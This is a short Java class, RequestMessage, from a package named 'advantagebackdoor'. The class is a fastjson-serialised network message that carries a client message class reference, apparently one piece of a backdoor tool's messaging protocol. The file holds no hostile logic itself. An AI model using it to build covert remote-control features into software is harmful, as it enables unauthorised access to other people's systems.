package me.faintcloudy.advantagebackdoor.api.message.play.server;

import com.alibaba.fastjson.annotation.JSONField;
import me.faintcloudy.advantagebackdoor.api.message.SimpleNetworkMessage;
import me.faintcloudy.advantagebackdoor.api.message.play.client.ClientNetworkMessage;

public class RequestMessage extends SimpleNetworkMessage {
    @JSONField
    public Class<? extends ClientNetworkMessage> requestMessageClass;
    public RequestMessage(Class<? extends ClientNetworkMessage> requestMessageClass)
    {
        this.requestMessageClass = requestMessageClass;
    }

    public RequestMessage() {}

    @Override
    public String toString() {
        return "RequestMessage{" +
                "requestMessageClass=" + requestMessageClass +
                '}';
    }
}
